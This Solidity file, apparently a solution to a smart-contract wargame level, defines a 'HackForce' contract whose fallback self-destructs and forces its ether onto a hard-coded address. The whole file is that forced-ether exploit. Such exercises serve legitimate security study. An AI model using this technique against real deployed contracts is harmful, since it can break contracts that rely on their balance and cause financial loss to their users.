// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract HackForce {
    fallback() external payable {
        selfdestruct(0x938753369B98ad4cb8CB7C10F98C763F9c04a643);
    }

}